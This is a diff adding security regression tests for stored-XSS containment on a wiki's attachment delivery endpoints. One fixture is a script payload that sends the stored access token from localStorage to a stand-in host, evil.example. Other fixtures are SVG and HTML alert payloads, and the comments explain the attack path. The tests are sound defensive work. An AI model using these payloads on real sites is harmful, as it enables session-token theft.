@@ -924,6 +924,115 @@ describe('Routes /api/v2 attachments (Hono)', () => {
     });
   });
 
+  describe('attachment delivery — stored-XSS containment', () => {
+    // The general page-attachment upload path records the multipart client's
+    // SELF-DECLARED `file.type` as `fileFormat` with no allowlist (the MIME
+    // allowlist only covers the editor paste/dnd intents), and delivery used to
+    // echo that value straight back as `Content-Type` with
+    // `Content-Disposition: inline`. On the recommended same-origin topology
+    // (web rewrites `/api/v2/*` to the api) that let any user with edit rights
+    // execute HTML on the wiki's own origin and read the JWT out of
+    // localStorage. Containment therefore has to live on the DELIVERY side, so
+    // that attachments already stored with a hostile `fileFormat` are covered
+    // too — validating only future uploads would leave them exploitable.
+
+    /** Upload `body` to a fresh page under `slug` declaring `contentType`, return the attachment id. */
+    const uploadDeclaring = async (slug: string, body: Buffer, filename: string, contentType: string): Promise<string> => {
+      const page = await createPageViaApi(accessToken, `${PATH_PREFIX}${slug}`, '# x');
+      const upload = await request(app)
+        .post(`/api/v2/pages/${page._id}/attachments`)
+        .set(authHeaders(accessToken))
+        .attach('file', body, { filename, contentType });
+      expect(upload.status).toBe(200);
+      return upload.body.attachment._id as string;
+    };
+
+    it('does not serve a text/html attachment inline as text/html', async () => {
+      const html = Buffer.from('<script>fetch("https://evil.example/?t="+localStorage.getItem("crowi:accessToken"))</script>');
+      const id = await uploadDeclaring(`xss-html-${Date.now()}`, html, 'payload.html', 'text/html');
+
+      const res = await request(app).get(`/api/v2/attachments/${id}`).set(authHeaders(accessToken)).buffer(true).parse(bufferParser);
+
+      expect(res.status).toBe(200);
+      expect(res.headers['content-type']).toBe('application/octet-stream');
+      expect(res.headers['content-disposition']).toMatch(/^attachment;/);
+      expect(res.headers['x-content-type-options']).toBe('nosniff');
+    });
+
+    it('does not serve an SVG attachment as image/svg+xml at all', async () => {
+      // `image/svg+xml` is allowlisted even on the VALIDATED editor paste path
+      // (`IMAGE_UPLOAD_MIME`), and uploaded SVG is never run through
+      // `@crowi/svg-sanitize` — so an SVG served with its real type is the same
+      // origin-executing payload as the HTML case above. Keeping the type and
+      // relying on `Content-Disposition: attachment` alone is NOT enough: the
+      // renderer retains raw `<object>`/`<embed>` (`known-tags.ts`), which load
+      // an SVG into a real browsing context, and whether they honour
+      // `Content-Disposition` is browser behaviour (cf. Firefox CVE-2025-6430)
+      // rather than a guarantee. So the type itself must not survive delivery.
+      const svg = Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script></svg>');
+      const id = await uploadDeclaring(`xss-svg-${Date.now()}`, svg, 'payload.svg', 'image/svg+xml');
+
+      const res = await request(app).get(`/api/v2/attachments/${id}`).set(authHeaders(accessToken)).buffer(true).parse(bufferParser);
+
+      expect(res.status).toBe(200);
+      expect(res.headers['content-type']).toBe('application/octet-stream');
+      expect(res.headers['content-disposition']).toMatch(/^attachment;/);
+      expect(res.headers['x-content-type-options']).toBe('nosniff');
+    });
+
+    it('cannot be pushed back onto the inline branch by decorating the declared type', async () => {
+      // The allowlist is matched on the bare, lowercased type, so parameters,
+      // casing and surrounding whitespace cannot smuggle `text/html` past it.
+      for (const [i, declared] of ['text/html; charset=utf-8', 'TEXT/HTML', ' text/html '].entries()) {
+        const id = await uploadDeclaring(`xss-variant-${i}-${Date.now()}`, Buffer.from('<script>alert(1)</script>'), 'p.html', 'image/png');
+        const Attachment = crowi.model('Attachment');
+        await Attachment.updateOne({ _id: id }, { $set: { fileFormat: declared } });
+
+        const res = await request(app).get(`/api/v2/attachments/${id}`).set(authHeaders(accessToken)).buffer(true).parse(bufferParser);
+
+        expect(res.headers['content-type']).toBe('application/octet-stream');
+        expect(res.headers['content-disposition']).toMatch(/^attachment;/);
+      }
+    });
+
+    it('still serves a genuine image inline, with nosniff', async () => {
+      const id = await uploadDeclaring(`xss-png-${Date.now()}`, pngBuffer, 'pixel.png', 'image/png');
+
+      const res = await request(app).get(`/api/v2/attachments/${id}`).set(authHeaders(accessToken)).buffer(true).parse(bufferParser);
+
+      expect(res.status).toBe(200);
+      expect(res.headers['content-type']).toBe('image/png');
+      expect(res.headers['content-disposition']).toMatch(/^inline;/);
+      expect(res.headers['x-content-type-options']).toBe('nosniff');
+      expect((res.body as Buffer).equals(pngBuffer)).toBe(true);
+    });
+
+    it('contains an attachment already stored with a hostile fileFormat (retroactive, not upload-time-only)', async () => {
+      // Upload as a legitimate PNG, then rewrite `fileFormat` directly to
+      // stand in for a row created before delivery-side containment existed.
+      const id = await uploadDeclaring(`xss-legacy-${Date.now()}`, pngBuffer, 'pixel.png', 'image/png');
+      const Attachment = crowi.model('Attachment');
+      await Attachment.updateOne({ _id: id }, { $set: { fileFormat: 'text/html' } });
+
+      const res = await request(app).get(`/api/v2/attachments/${id}`).set(authHeaders(accessToken)).buffer(true).parse(bufferParser);
+
+      expect(res.status).toBe(200);
+      expect(res.headers['content-type']).toBe('application/octet-stream');
+      expect(res.headers['content-disposition']).toMatch(/^attachment;/);
+    });
+
+    it('applies the same containment on /original', async () => {
+      const html = Buffer.from('<script>alert(1)</script>');
+      const id = await uploadDeclaring(`xss-orig-${Date.now()}`, html, 'payload.html', 'text/html');
+
+      const res = await request(app).get(`/api/v2/attachments/${id}/original`).set(authHeaders(accessToken)).buffer(true).parse(bufferParser);
+
+      expect(res.status).toBe(200);
+      expect(res.headers['content-type']).toBe('application/octet-stream');
+      expect(res.headers['content-disposition']).toMatch(/^attachment;/);
+    });
+  });
+
   describe('GET /api/v2/attachments/:id/meta (single attachment metadata)', () => {
     /** Upload a PNG to a page and return its attachment id. */
     const uploadTo = async (pageId: string) => {
